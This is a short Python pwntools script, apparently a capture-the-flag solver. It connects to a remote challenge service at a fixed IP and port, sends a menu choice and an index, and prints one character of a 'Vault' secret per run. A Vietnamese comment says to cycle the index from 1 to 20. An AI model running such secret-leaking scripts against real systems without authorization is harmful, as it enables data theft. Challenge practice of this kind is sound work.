#!python3
from pwn import *
i = 20
#thay lan luot tu 1 den 20
p = remote("134.209.177.202",30325 )
p.recvuntil(b"> ")
p.sendline(b'1')
p.recvuntil(b'(0-31): ')
p.sendline(str(i).encode())
p.sendline(b'2')
a = p.recvuntil(b'Vault: ')
print(chr(p.recvline()[i]))